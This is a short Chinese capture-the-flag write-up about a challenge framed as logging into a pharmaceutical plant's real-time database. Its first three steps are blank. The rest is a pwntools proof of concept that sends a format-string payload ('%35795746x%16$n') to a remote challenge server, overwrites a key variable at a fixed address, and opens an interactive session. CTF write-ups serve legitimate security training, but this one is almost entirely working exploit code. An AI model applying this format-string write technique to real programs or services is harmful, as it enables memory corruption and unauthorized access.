# 实时数据监测

> 题目描述：小A在对某家医药工厂进行扫描的时候，发现了一个大型实时数据库系统。小A意识到实时数据库系统会采集并存储与工业流程相关的上千节点的数据，只要登录进去，就能拿到有价值的数据。小A在尝试登陆实时数据库系统的过程中，一直找不到修改登录系统key的方法，虽然她现在收集到了能够登陆进系统的key的值，但是只能想别的办法来登陆。

## Writeup

1.

2.

3.

4. POC：
```python
import pwn

pwn.context(arch='i386', os='linux')

#p = pwn.process('./9926c1a194794984978011fc619e3301')
p = pwn.remote('220.249.52.133', 30149)

key_addr = 0x804A048
payload = b'%35795746x%16$n\x00' + pwn.p32(key_addr)    # %x：写入35795746个字符，$16$n：偏移量为16，payload = arg1 + arg2（中间用\x00隔开）

p.sendline(payload)

p.interactive()
```